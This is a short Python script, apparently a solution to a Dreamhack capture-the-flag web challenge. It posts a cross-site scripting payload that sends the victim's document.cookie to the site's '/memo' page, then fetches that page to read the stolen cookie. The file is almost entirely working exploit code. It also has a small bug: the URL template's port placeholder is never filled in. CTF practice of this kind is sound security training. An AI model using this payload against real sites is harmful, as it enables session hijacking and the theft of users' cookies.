import requests

port = 19125
url_index = "http://host1.dreamhack.games:{port}"
url_memo = url_index + '/memo'
url_flag = url_index + '/flag'
param = {'param' : '<script>location.href = "/memo?memo=" + document.cookie;</script>'}
requests.post(url_flag, data = param)
response = requests.get(url_memo)
print(response.text)